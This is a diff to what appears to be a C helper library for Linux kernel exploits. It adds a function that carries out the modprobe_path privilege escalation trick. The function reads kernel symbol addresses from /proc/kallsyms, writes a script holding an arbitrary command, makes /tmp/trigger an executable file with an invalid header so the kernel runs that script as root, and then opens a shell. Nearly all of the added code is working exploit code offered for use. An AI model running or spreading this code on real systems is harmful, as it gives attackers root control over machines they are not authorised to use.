@@ -11,6 +11,7 @@
 #ifndef __GLIBC__
 #define ENABLE_USERFAULTFD
 #endif
+#define ENABLE_MODPROBE_PATH
 #define ENABLE_COMM
 #define ENABLE_DUMP
 
@@ -414,6 +415,31 @@ void reenable_userfault(void *addr, size_t length) {
   if (err == -1) {
     ABORT("madvise");
   }
+}
+
+#endif
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+#ifdef ENABLE_MODPROBE_PATH
+#include <stdio.h>
+#include <stdlib.h>
+
+void exec_modprobe_path(char *path, char *command) {
+  char buffer[0x200];
+  char *format =
+      "echo ============================;"
+      "echo [DEBUG];"
+      "egrep ' (modprobe_path|call_usermodehelper_setup)$' /proc/kallsyms;"
+      "echo -n '/proc/sys/kernel/modprobe = ';"
+      "cat /proc/sys/kernel/modprobe;"
+      "echo ============================;"
+      "echo -e '#!/bin/sh\\n%2$s' > %1$s;"
+      "chmod +x %1$s;"
+      "echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger;"
+      "chmod +x /tmp/trigger;"
+      "/tmp/trigger;"
+      "/bin/sh";
+  snprintf(buffer, sizeof(buffer), format, path, command);
+  system(buffer);
 }
 
 #endif
